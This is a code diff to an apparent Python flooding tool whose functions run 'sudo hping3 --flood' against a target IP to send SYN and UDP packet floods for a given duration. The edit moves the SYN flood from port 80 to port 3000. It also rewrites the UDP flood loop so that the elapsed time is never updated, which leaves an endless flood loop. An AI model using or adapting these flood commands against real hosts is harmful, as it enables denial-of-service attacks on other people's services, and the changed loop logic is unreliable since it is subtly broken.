@@ -63,11 +63,13 @@ def hping_icmp_flood(ip,duration):
 def hping_http_flood(ip,duration):
     start_time = t.time() 
     while t.time() - start_time <  duration :
-        sb.run(f"sudo hping3 -S {ip} -p 80 --flood",shell=True,stdout=sb.DEVNULL, stderr=sb.DEVNULL)
+        sb.run(f"sudo hping3 -S {ip} -p 3000 --flood",shell=True,stdout=sb.DEVNULL, stderr=sb.DEVNULL)
 
 def hping_udp_flood(ip,duration):
     start_time = t.time() 
-    while t.time() - start_time <  duration :
+    diff = (t.time() - start_time)
+    while diff <  duration :
+
         sb.run(f"sudo hping3 --udp {ip} --flood",shell=True,stdout=sb.DEVNULL, stderr=sb.DEVNULL)
 
 
